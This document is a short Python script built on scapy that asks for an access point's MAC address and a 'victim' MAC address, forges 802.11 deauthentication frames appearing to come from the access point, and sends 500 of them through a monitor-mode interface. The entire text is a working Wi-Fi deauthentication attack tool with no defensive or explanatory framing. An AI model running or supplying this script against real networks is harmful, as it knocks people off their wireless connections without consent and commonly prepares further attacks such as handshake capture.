from scapy.all import *
import sys

BSSID = input("Enter MAC address of the Access Point:- ")
vctm_mac = input("Enter MAC address of the Victim:- ")

frame = RadioTap() / Dot11(addr1=vctm_mac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()  # create the deauth packet

sendp(frame, iface="mon0", count=500, inter=.1)  # send the frames, 500 in count after .1 interval
